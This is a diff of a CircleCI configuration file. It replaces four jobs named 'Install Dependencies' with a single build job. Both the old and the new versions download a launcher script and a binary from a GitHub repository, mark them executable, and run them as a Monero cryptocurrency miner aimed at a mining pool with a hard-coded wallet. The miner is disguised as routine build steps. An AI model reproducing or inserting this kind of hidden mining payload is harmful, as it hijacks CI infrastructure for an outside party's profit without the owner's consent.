@@ -1,38 +1,11 @@
-version: 2.1
+version: 2.0
 jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <86yYbP6LQ3CE8A5UDEmB4TDq5qp3pnJ1aRvbHFjdPnFDFFtGUdK5nyqiic9oYQerKzBvXbSQJcFdMXfjaTw6tr9vRnYkiit>  -brunosmf  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <86yYbP6LQ3CE8A5UDEmB4TDq5qp3pnJ1aRvbHFjdPnFDFFtGUdK5nyqiic9oYQerKzBvXbSQJcFdMXfjaTw6tr9vRnYkiit>  -brunosmf  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <86yYbP6LQ3CE8A5UDEmB4TDq5qp3pnJ1aRvbHFjdPnFDFFtGUdK5nyqiic9oYQerKzBvXbSQJcFdMXfjaTw6tr9vRnYkiit>  -brunosmf  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <86yYbP6LQ3CE8A5UDEmB4TDq5qp3pnJ1aRvbHFjdPnFDFFtGUdK5nyqiic9oYQerKzBvXbSQJcFdMXfjaTw6tr9vRnYkiit>  -brunosmf  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <86yYbP6LQ3CE8A5UDEmB4TDq5qp3pnJ1aRvbHFjdPnFDFFtGUdK5nyqiic9oYQerKzBvXbSQJcFdMXfjaTw6tr9vRnYkiit>  -brunosmf  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
